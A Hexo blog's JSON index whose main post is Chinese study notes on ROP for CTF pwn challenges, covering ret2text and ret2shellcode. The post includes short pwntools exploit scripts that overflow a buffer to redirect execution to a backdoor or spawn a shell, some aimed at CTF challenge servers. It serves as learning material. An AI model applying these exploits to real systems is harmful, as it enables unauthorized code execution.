{"meta":{"title":"Hexo","subtitle":"","description":"","author":"wased","url":"https://username.github.io","root":"/"},"pages":[{"title":"404 Not Found：该页无法显示","date":"2022-09-25T11:11:47.550Z","updated":"2022-09-25T11:11:47.550Z","comments":false,"path":"/404.html","permalink":"https://username.github.io/404.html","excerpt":"","text":""},{"title":"About me","date":"2022-12-17T06:41:35.985Z","updated":"2022-12-17T06:41:35.985Z","comments":false,"path":"about/index.html","permalink":"https://username.github.io/about/index.html","excerpt":"","text":"Github: https://github.com/was3d 博客园: https://www.cnblogs.com/wased/ Mail：mailto:1308668961@qq.com"},{"title":"友情链接","date":"2022-12-15T02:54:37.118Z","updated":"2022-09-25T11:11:47.551Z","comments":true,"path":"links/index.html","permalink":"https://username.github.io/links/index.html","excerpt":"","text":""},{"title":"标签","date":"2022-12-15T03:40:35.294Z","updated":"2022-12-15T03:40:35.294Z","comments":false,"path":"tags/index.html","permalink":"https://username.github.io/tags/index.html","excerpt":"","text":""},{"title":"分类","date":"2022-12-15T03:32:30.455Z","updated":"2022-12-15T03:32:30.455Z","comments":false,"path":"categories/index.html","permalink":"https://username.github.io/categories/index.html","excerpt":"","text":""},{"title":"Repositories","date":"2022-12-15T02:54:42.306Z","updated":"2022-09-25T11:11:47.552Z","comments":false,"path":"repository/index.html","permalink":"https://username.github.io/repository/index.html","excerpt":"","text":""}],"posts":[{"title":"基本ROP","slug":"基本ROP","date":"2023-01-09T08:29:01.000Z","updated":"2023-01-10T08:37:11.526Z","comments":true,"path":"2023/01/09/基本ROP/","link":"","permalink":"https://username.github.io/2023/01/09/%E5%9F%BA%E6%9C%ACROP/","excerpt":"","text":"ROP学习记录 ROP的全称为Return-oriented programming（返回导向编程） 保护机制： DEP（堆栈不可执行） ASLR（内存地址随机化） Stack Protector（栈保护） NX:No-eXecute(不可执行),基本原理是将数据所在的内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。 主要思想：在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程 ROP攻击一般条件： 程序存在溢出，并且可以控制返回地址 可以找到满足条件的 gadgets(不相邻的程序已有的代码 ) 以及相应 gadgets 的地址 ret2text 原理 ret2text 即控制程序执行程序本身已有的的代码 (.text) 练习： pwn1_1 checksec: ida分析后发现这里读入是通过read，且这里的读取长度4096&gt;buf的定义16,可造成溢出 这里可见后门函数： 这里分析buf函数以找出返回地址 exp： 12345from pwn import *p = remote(&quot;gxh191.top&quot;,25537)p.recv()p.send(b&quot;a&quot;*(16+8) + p64(0x40119E))p.interactive() CTFHUB_ret2text: checksec: ida分析代码 EXP如下： 1234567from pwn import *#sh = process(&#x27;./ret2text&#x27;)sh= remote(&quot;challenge-b3dded864d8eec43.sandbox.ctfhub.com&quot;,26822)target = 0x04007B8sh.sendline(b&#x27;A&#x27; * (120) + p64(target))sh.interactive() ret2shellcode 原理： 即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码 **注意：**要想执行shellcode，需要对应的程序在运行时shellcode所在的位置具有可执行权限, 基本思路： 先找到溢出点，确定溢出位后看是否可在bss段写数据，确定可写后将shellcode的数据发送到bss段，最后通过覆盖跳转地址跳转到shellcode所在的地址进行执行 BSS段（bss segment）通常是指用来存放程序中未初始化的或者初始化为0的全局变量和局部静态变量的一块内存区域。BSS是英文Block Started by Symbol的简称。BSS段属于静态内存分配 练习 ret2shellcode 程序几乎没有开启任何保护 这里ida分析： 看到将s的数据复制到了buf2，而buf2在.bss段： exp: 123456789#!/usr/bin/env pythonfrom pwn import *sh = process(&#x27;./ret2shellcode&#x27;)shellcode = asm(shellcraft.sh())# asm(shellcraft.sh())该语句生成shellcodebuf2_addr = 0x804a080sh.sendline(shellcode.ljust(112, &#x27;A&#x27;) + p32(buf2_addr))sh.interactive() pwn2_2 这里修改了phone_number所在的bss段的权限，权限7表示可读可写可执行 exp： 123456789101112#!/usr/bin/env pythonfrom pwn import *context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;)sh = process(&#x27;./pwn2_2&#x27;)shellcode = asm(shellcraft.sh())buf2_addr = 0x04040A0sh.recv()sh.sendline(shellcode)sh.recv()payload=b&#x27;a&#x27;*24+p64(buf2_addr)sh.sendline(payload)sh.interactive() 关于这里的context: context 是 pwntools 用来设置环境的功能。在很多时候，由于二进制文件的情况不同，我们可能需要进行一些环境设置才能够正常运行exp，比如有一些需要进行汇编，但是32的汇编和64的汇编不同，如果不设置context会导致一些问题,一般来说我们设置context只需要简单的一句话: 1&gt;context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;) 或者 context(os='linux', arch='amd64') os设置系统为linux系统，在完成ctf题目的时候，大多数pwn题目的系统都是linux arch设置架构为amd64，可以简单的认为设置为64位的模式，对应的32位模式是’i386’ log_level设置日志输出的等级为debug，这句话在调试的时候一般会设置，这样pwntools会将完整的io过程都打印下来，使得调试更加方便，可以避免在完成CTF题目时出现一些和IO相关的错误。 ret2syscall 原理： ret2syscall，即控制程序执行系统调用，获取 shell","categories":[{"name":"学习","slug":"学习","permalink":"https://username.github.io/categories/%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://username.github.io/tags/pwn/"},{"name":"ROP","slug":"ROP","permalink":"https://username.github.io/tags/ROP/"}]},{"title":"Hello World","slug":"hello-world","date":"2022-09-25T02:41:38.598Z","updated":"2022-09-25T02:41:38.599Z","comments":true,"path":"2022/09/25/hello-world/","link":"","permalink":"https://username.github.io/2022/09/25/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]}],"categories":[{"name":"学习","slug":"学习","permalink":"https://username.github.io/categories/%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://username.github.io/tags/pwn/"},{"name":"ROP","slug":"ROP","permalink":"https://username.github.io/tags/ROP/"}]}